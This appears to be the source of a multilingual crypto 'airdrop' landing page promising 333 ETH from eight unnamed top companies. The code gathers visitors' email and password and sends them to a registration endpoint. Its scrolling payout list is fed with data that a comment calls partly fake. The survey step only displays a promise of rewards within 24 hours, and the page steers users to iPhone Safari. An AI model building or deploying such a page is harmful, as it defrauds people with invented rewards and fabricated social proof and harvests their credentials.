<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>W-Airdrop</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
    .marquee-content { display: flex; white-space: nowrap; animation: scroll 30s linear infinite; }
    @keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 50; align-items: center; justify-content: center; }
    .modal.active { display: flex; }
    .lang-menu { display: none; }
    .lang-menu.active { display: block; }
</style>
</head>
<body class="bg-[#f3f4f9] font-sans text-gray-800">

<!-- 跑马灯 -->
<div class="bg-[#0b1b3a] text-white text-[13px] py-2 overflow-hidden" id="marqueeContainer">
    <div class="marquee-content" id="marqueeData"></div>
</div>

<!-- 导航栏 -->
<header class="bg-white shadow-sm sticky top-0 z-40">
    <div class="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
        <div class="flex items-center gap-2 font-extrabold text-xl italic text-[#0A3466]">W-Airdrop</div>
        <div class="flex items-center gap-4">
            <!-- 语言切换 -->
            <div class="relative">
                <button onclick="toggleLangMenu()" class="flex items-center gap-1 text-sm font-medium border px-3 py-1.5 rounded-lg hover:bg-gray-50">🌐 <span id="currentLangText">中文</span></button>
                <div id="langMenu" class="lang-menu absolute right-0 mt-2 w-32 bg-white border shadow-xl rounded-lg overflow-hidden z-50">
                    <a href="#" onclick="changeLang('zh')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇨🇳 中文</a>
                    <a href="#" onclick="changeLang('en')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇺🇸 English</a>
                    <a href="#" onclick="changeLang('vi')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇻🇳 Tiếng Việt</a>
                    <a href="#" onclick="changeLang('ko')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇰🇷 한국어</a>
                    <a href="#" onclick="changeLang('de')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇩🇪 Deutsch</a>
                    <a href="#" onclick="changeLang('ar')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇦🇪 العربية</a>
                    <a href="#" onclick="changeLang('es')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇦🇷 Español</a>
                    <a href="#" onclick="changeLang('pt')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇧🇷 Português</a>
                    <a href="#" onclick="changeLang('uk')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇺🇦 Українська</a>
                    <a href="#" onclick="changeLang('tr')" class="block px-4 py-2 text-sm hover:bg-gray-100">🇹🇷 Türkçe</a>
                </div>
            </div>
            <button onclick="triggerSafariCheck('login')" class="bg-blue-600 text-white px-5 py-2 rounded-lg font-medium hover:bg-blue-700" data-i18n="login">登录</button>
        </div>
    </div>
</header>

<main class="max-w-4xl mx-auto px-4 py-8 space-y-12">
    <!-- 新闻模块 (图文上下排列) -->
    <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 cursor-pointer" onclick="triggerSafariCheck('article')">
        <h2 class="text-xl font-bold mb-2 line-clamp-1" id="newsTitle">加载中...</h2>
        <p class="text-gray-600 text-sm line-clamp-2 mb-4" id="newsSummary"></p>
        <img id="newsCover" src="" class="w-full h-48 object-cover rounded-xl mb-4 hidden">
        <div class="text-blue-600 font-medium text-sm text-center" data-i18n="readMore">查看全文</div>
    </div>

    <!-- Hero -->
    <div class="text-center space-y-4">
        <h1 class="text-3xl font-extrabold text-[#0A3466] leading-tight" data-i18n="heroTitle">
            WEB3智能时代 8家顶级公司联合打造空投发送333ETH奖励
        </h1>
        <p class="text-gray-500" data-i18n="heroDesc">使用我们8家产品的用户都能参加，无需任何操作，简单领取奖励，24小时内免费空投发放。</p>
        <button onclick="triggerSafariCheck('register')" class="bg-blue-600 text-white px-10 py-4 rounded-full font-bold text-lg hover:bg-blue-700 shadow-lg mt-2" data-i18n="claimBtn">免费领取</button>
    </div>

    <!-- 动态问卷内容区（省略图表，直接弹窗） -->
</main>

<!-- ================= 弹窗区 ================= -->

<!-- Safari 拦截 -->
<div id="safariModal" class="modal">
    <div class="bg-[#0b1b3a] w-[90%] max-w-sm rounded-2xl p-6 text-center text-white border border-blue-900 relative">
        <button onclick="closeModal('safariModal')" class="absolute top-2 right-3 text-2xl text-gray-400">&times;</button>
        <h3 class="text-xl font-bold mb-2" data-i18n="safariTitle">请使用 Safari 浏览器打开</h3>
        <p class="text-sm text-gray-300 mb-6" data-i18n="safariDesc">请使用 iPhone 自带的 Safari 浏览器继续访问。</p>
        <button onclick="copyLink()" class="w-full bg-blue-600 py-3 rounded-xl font-bold" data-i18n="copyBtn">复制当前链接</button>
        <p id="copyMsg" class="text-green-400 text-sm hidden mt-2">已复制</p>
    </div>
</div>

<!-- 注册 -->
<div id="registerModal" class="modal">
    <div class="bg-white w-[90%] max-w-sm rounded-2xl p-6 relative">
        <button onclick="closeModal('registerModal')" class="absolute top-2 right-3 text-2xl text-gray-400">&times;</button>
        <h3 class="text-xl font-bold mb-4 text-center" data-i18n="registerTitle">注册账号</h3>
        <input type="email" id="regEmail" placeholder="Email" class="w-full border p-3 rounded-lg mb-3">
        <input type="password" id="regPass" placeholder="Password" class="w-full border p-3 rounded-lg mb-4">
        <button onclick="doRegister()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold" data-i18n="registerBtn">立即注册</button>
    </div>
</div>

<!-- 问卷 -->
<div id="surveyModal" class="modal">
    <div class="bg-[#1e293b] w-[90%] max-w-md rounded-2xl p-6 text-white relative">
        <button onclick="closeModal('surveyModal')" class="absolute top-2 right-3 text-2xl text-gray-400">&times;</button>
        <h3 class="text-lg font-bold text-center mb-6" data-i18n="surveyTitle">用户习惯请您认真填写</h3>
        <div id="surveyQuestions" class="space-y-4 mb-6"></div>
        <button onclick="submitSurvey()" class="w-full bg-blue-600 py-3 rounded-lg font-bold" data-i18n="nextBtn">下一步</button>
    </div>
</div>

<script>
    // 多语言字典（简易版，取机翻）
    const i18n = {
        zh: { login: "登录", readMore: "查看全文", claimBtn: "免费领取", safariTitle: "请使用 Safari 浏览器打开", safariDesc: "请使用 iPhone / iPad 自带的 Safari 浏览器继续访问。", copyBtn: "复制当前链接", registerTitle: "注册账号", registerBtn: "立即注册", surveyTitle: "用户习惯请您认真填写", nextBtn: "下一步", heroTitle: "WEB3智能时代 8家顶级公司联合打造空投发送333ETH奖励", heroDesc: "使用我们8家产品的用户都能参加，无需任何操作，简单领取奖励，24小时内免费空投发放。" },
        en: { login: "Login", readMore: "Read More", claimBtn: "Claim Free", safariTitle: "Please open in Safari", safariDesc: "Please use the native Safari browser on iPhone / iPad.", copyBtn: "Copy Link", registerTitle: "Register", registerBtn: "Register Now", surveyTitle: "Please fill out the survey", nextBtn: "Next", heroTitle: "8 Top Companies Jointly Launch 333 ETH Airdrop", heroDesc: "Users of our 8 products can participate, no action required, simply claim rewards, airdropped for free within 24 hours." },
        vi: { login: "Đăng nhập", readMore: "Đọc thêm", claimBtn: "Nhận miễn phí", safariTitle: "Vui lòng mở bằng Safari", safariDesc: "Vui lòng sử dụng trình duyệt Safari gốc trên iPhone / iPad.", copyBtn: "Sao chép liên kết", registerTitle: "Đăng ký", registerBtn: "Đăng ký ngay", surveyTitle: "Vui lòng điền khảo sát", nextBtn: "Tiếp theo", heroTitle: "8 công ty hàng đầu cùng ra mắt Airdrop 333 ETH", heroDesc: "Người dùng 8 sản phẩm có thể tham gia, nhận thưởng miễn phí trong 24h." },
        ko: { login: "로그인", readMore: "더보기", claimBtn: "무료 청구", safariTitle: "Safari로 열어주세요", safariDesc: "iPhone / iPad의 기본 Safari 브라우저를 사용하세요.", copyBtn: "링크 복사", registerTitle: "회원가입", registerBtn: "지금 가입", surveyTitle: "설문 조사를 작성해주세요", nextBtn: "다음", heroTitle: "8개 최고 기업 공동 333 ETH 에어드롭", heroDesc: "8개 제품 사용자 누구나 참여 가능, 24시간 내 무료 에어드롭." },
        de: { login: "Anmelden", readMore: "Weiterlesen", claimBtn: "Gratis erhalten", safariTitle: "Bitte in Safari öffnen", safariDesc: "Bitte verwenden Sie den nativen Safari-Browser auf iPhone / iPad.", copyBtn: "Link kopieren", registerTitle: "Registrieren", registerBtn: "Jetzt registrieren", surveyTitle: "Bitte füllen Sie die Umfrage aus", nextBtn: "Weiter", heroTitle: "8 Top-Unternehmen starten gemeinsam 333 ETH Airdrop", heroDesc: "Nutzer unserer 8 Produkte können teilnehmen, einfache Belohnung, innerhalb von 24 Stunden kostenlos." },
        // 简略其他语言，实际使用可以补全
    };
    
    let currentLang = 'zh';
    let latestArticleId = null;

    function toggleLangMenu() { document.getElementById('langMenu').classList.toggle('active'); }
    
    function changeLang(lang) {
        currentLang = lang;
        document.getElementById('langMenu').classList.remove('active');
        document.getElementById('currentLangText').innerText = lang.toUpperCase();
        applyLanguage();
        loadNews(); // 重新加载对应语言的文章
    }

    function applyLanguage() {
        const dict = i18n[currentLang] || i18n['en']; // 没翻译的默认用英文
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (dict[key]) el.innerText = dict[key];
        });
    }

    // === 核心逻辑 ===
    function isSafari() {
        const ua = navigator.userAgent;
        return /iPad|iPhone|iPod/.test(ua) && /Safari/.test(ua) && !/CriOS|FxiOS|EdgiOS|MQQBrowser|MicroMessenger|Android/.test(ua);
    }

    function triggerSafariCheck(action) {
        if (isSafari()) {
            if (action === 'login' || action === 'register') openModal('registerModal');
            else if (action === 'article' && latestArticleId) window.location.href = `/article.html?id=${latestArticleId}`;
        } else {
            openModal('safariModal');
        }
    }

    function openModal(id) { document.getElementById(id).classList.add('active'); }
    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
    function copyLink() { navigator.clipboard.writeText(window.location.href); document.getElementById('copyMsg').classList.remove('hidden'); }

    // === 跑马灯 (真实+假数据 补全) ===
    async function loadMarquee() {
        const res = await fetch('/api/marquee');
        const data = await res.json();
        // 生成两份，实现无缝滚动
        let html = '';
        [...data, ...data].forEach(item => {
            html += `<span class="inline-flex items-center gap-2 px-4"><i class="w-2 h-2 rounded-full bg-green-500"></i>${item.name} <b class="text-green-400">+${item.amount}</b></span>`;
        });
        document.getElementById('marqueeData').innerHTML = html;
    }

    // === 新闻 (图文上下) ===
    async function loadNews() {
        const res = await fetch(`/api/articles/latest?lang=${currentLang}`);
        const data = await res.json();
        if (data) {
            latestArticleId = data.id;
            document.getElementById('newsTitle').innerText = data.title;
            document.getElementById('newsSummary').innerText = data.summary;
            if (data.coverUrl) {
                const img = document.getElementById('newsCover');
                img.src = data.coverUrl;
                img.classList.remove('hidden');
            }
        } else {
            document.getElementById('newsTitle').innerText = "暂无该语言的新闻";
            document.getElementById('newsSummary').innerText = "";
        }
    }

    // === 注册与问卷 ===
    async function doRegister() {
        const email = document.getElementById('regEmail').value;
        const password = document.getElementById('regPass').value;
        if(!email || !password) return alert('请填写');
        const res = await fetch('/api/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email, password}) });
        const data = await res.json();
        if (data.success) {
            closeModal('registerModal');
            loadSurveyQuestions();
            openModal('surveyModal');
        } else alert(data.error);
    }

    async function loadSurveyQuestions() {
        const res = await fetch('/api/survey/questions');
        const questions = await res.json();
        let html = '';
        questions.forEach((q, i) => {
            html += `<div><p class="text-sm mb-2">${i+1}. ${q.title}</p>`;
            q.options.forEach(opt => {
                html += `<label class="flex items-center gap-2 text-sm text-gray-300 mb-1"><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
            });
            html += `</div>`;
        });
        document.getElementById('surveyQuestions').innerHTML = html;
    }

    async function submitSurvey() {
        // 收集答案逻辑
        alert('提交成功，奖励24小时内发放');
        closeModal('surveyModal');
    }

    // 初始化
    applyLanguage();
    loadMarquee();
    loadNews();
</script>
</body>
</html>
